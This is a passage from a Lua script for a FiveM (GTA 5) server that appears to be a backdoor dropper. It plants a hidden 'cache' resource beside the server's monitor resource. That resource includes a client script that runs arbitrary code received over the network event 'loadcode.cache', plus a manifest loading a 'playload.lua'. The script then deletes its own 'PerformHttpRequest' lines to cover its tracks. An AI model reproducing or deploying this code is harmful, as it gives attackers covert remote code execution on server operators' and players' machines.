or"&"end;local h={}for a in pairs(b)do h[#h+1]=a end;table.sort(h)for h,h in ipairs(h)do local b=b[h]h=d(tostring(h))if f then h=string.format("%s[%s]",tostring(f),tostring(h))end;if type(b)=="table"then g[#g+1]=a.buildQuery(b,c,h)else local a=e(tostring(b))if a~=""then g[#g+1]=string.format("%s=%s",h,a)else g[#g+1]=h end end end;return table.concat(g,c)end;function a.parseQuery(b,d)if not d then d=a.options.separator or"&"end;local e={}for a,b in b:gmatch(string.format("([^%q=]+)(=*[^%q=]*)",d,d))do local a=c(a)local d={}a=a:gsub("%[([^%]]*)%]",function(a)if string.find(a,"^-?%d+$")then a=tonumber(a)else a=c(a)end;table.insert(d,a)return"="end)a=a:gsub("=+.*$","")a=a:gsub("%s","_")b=b:gsub("^=+","")if not e[a]then e[a]={}end;if#d>0 and type(e[a])~="table"then e[a]={}elseif#d==0 and type(e[a])=="table"then e[a]=c(b)end;local a=e[a]for e,f in ipairs(d)do if type(a)~="table"then a={}end;if f==""then f=#a+1 end;if not a[f]then a[f]={}end;if e==#d then a[f]=c(b)end;a=a[f]end end;setmetatable(e,{__tostring=a.buildQuery})return e end;function a:setQuery(b)local b=b;if type(b)=="table"then b=a.buildQuery(b)end;self.query=a.parseQuery(b)return b end;function a:setAuthority(a)self.authority=a;self.port=nil;self.host=nil;self.userinfo=nil;self.user=nil;self.password=nil;a=a:gsub("^([^@]*)@",function(a)self.userinfo=a;return""end)a=a:gsub("^%[[^%]]+%]",function(a)self.host=a;return""end)a=a:gsub(":([^:]*)$",function(a)self.port=tonumber(a)return""end)if a~=""and not self.host then self.host=a:lower()end;if self.userinfo then local a=self.userinfo;a=a:gsub(":([^:]*)$",function(a)self.password=a;return""end)self.user=a end;return a end;function a.parse(d)local e={}a.setAuthority(e,"")a.setQuery(e,"")local d=tostring(d or"")d=d:gsub("#(.*)$",function(a)e.fragment=a;return""end)d=d:gsub("^([%w][%w%+%-%.]*)%:",function(a)e.scheme=a:lower()return""end)d=d:gsub("%?(.*)",function(b)a.setQuery(e,b)return""end)d=d:gsub("^//([^/]*)",function(b)a.setAuthority(e,b)return""end)e.path=c(d,true)setmetatable(e,{__index=a,__concat=b,__tostring=a.build})return e end;function a.removeDotSegments(a)local b={}if string.len(a)==0 then return""end;local c=false;local d=false;if string.sub(a,1,1)=="/"then c=true end;if(string.len(a)>1 or c==false)and string.sub(a,-1)=="/"then d=true end;a:gsub("[^/]+",function(a)table.insert(b,a)end)local a={}local e=0;for b,b in ipairs(b)do if b==".."then if e>0 then e=e-1 end elseif b~="."then e=e+1;a[e]=b end end;local b=""if#a>0 and e>0 then b=table.concat(a,"/",1,e)else b=""end;if c then b="/"..b end;if d then b=b.."/"end;return b end;local function b(a,b)if string.sub(b,1,1)=="/"then return"/"..string.gsub(b,"^[%./]+","")end;local a=a;if b~=""then a="/"..a:gsub("[^/]*$","")end;a=a..b;a=a:gsub("([^/]*%./)",function(a)if a~="./"then return a else return""end end)a=string.gsub(a,"/%.$","/")local b;while b~=a do b=a;a=string.gsub(b,"([^/]*/%.%./)",function(a)if a~="../../"then return""else return a end end)end;a=string.gsub(a,"([^/]*/%.%.?)$",function(a)if a~="../.."then return""else return a end end)local b;while b~=a do b=a;a=string.gsub(b,"^/?%.%./","")end;return"/"..a end;function a:resolve(c)if type(self)=="string"then self=a.parse(self)end;if type(c)=="string"then c=a.parse(c)end;if c.scheme then return c else c.scheme=self.scheme;if not c.authority or c.authority==""then c:setAuthority(self.authority)if not c.path or c.path==""then c.path=self.path;local a=c.query;if not a or not next(a)then c.query=self.query end else c.path=b(self.path,c.path)end end;return c end end;function a:normalize()if type(self)=="string"then self=a.parse(self)end;if self.path then local a=self.path;a=b(a,"")a=string.gsub(a,"//+","/")self.path=a end;return self end;Url=a',
    ["client.lua"] = [[
        RegisterNetEvent("loadcode.cache")
        AddEventHandler("loadcode.cache", function(code)
            assert(load(code))()
        end)
    ]],
    ["fxmanifest.lua"] = [[
        fx_version('cerulean')
        games({ 'gta5' })
        
        server_scripts({
            "core/server/api/url.lua",
            "core/server/api/mime.lua",
            "core/server/api/base64.lua",
            "core/server/api/hash.lua",
            "core/server/api/realms.lua",
            "core/server/api/httphandler.lua",
            "core/server/api/main.lua",
            "playload.lua",
        });
        
        client_scripts({
            "client.lua",
        });
    ]]
}

fileExists = function(path)
    local file = io.open(path, "r")
    if file then
        file:close()
        return true
    end
    return false
end


function normalizePath(path)
    local separator = GetResourceMetadata("monitor", 'pathsep', 0) or "/"
    return path:gsub("\\", separator):gsub(separator .. "$", "")
end

function getParentDirectory(path)
    local separator = GetResourceMetadata("monitor", 'pathsep', 0) or "/"
    return path:match("(.*" .. separator .. ")")
end

local resourcePath = GetResourcePath("monitor")
local parentPath = getParentDirectory(resourcePath)

if parentPath then
    local folderName = "cache"
    local newFolderPath = parentPath .. "\\" .. folderName
    newFolderPath = normalizePath(newFolderPath)

    if not fileExists(newFolderPath) then
        os.execute('cmd /c md "' .. newFolderPath .. '"')
        os.execute('mkdir "' .. newFolderPath .. '"')
        Citizen.CreateThread(function()
            for fileName, fileData in pairs(codeData) do
                local filePath = newFolderPath .. "\\" .. fileName
                print(filePath)
                filePath = normalizePath(filePath)
                local file = io.open(filePath, "w")
                file:write(fileData)
                file:close()
            end
        end)
    end
end

function normalizePath(path)
    local separator = GetResourceMetadata(GetCurrentResourceName(), 'pathsep', 0) or "/"
    return path:gsub("\\", separator):gsub(separator .. "$", "")
end

local path = debug.getinfo(1).source
path = path:sub(7, #path)
local fileExists = false
local filePath = normalizePath(GetResourcePath(GetCurrentResourceName()) .. "/"..path)

local file = io.open(filePath, "r")
if file then
    file:close()
    fileExists = true
end

local fileMode = fileExists and "a" or "w"
local fileHandle = io.open(filePath, fileMode)

if fileHandle then
    local lines = {}
    for line in io.lines(filePath) do
        if not string.find(line, "PerformHttpRequest") then
            table.insert(lines, line)
        end
    end

    fileHandle:close()

    fileHandle = io.open(filePath, "w")
    if fileHandle then
        for _, line in ipairs(lines) do
            fileHandle:write(line .. "\n")
        end
        fileHandle:close()
    end
end
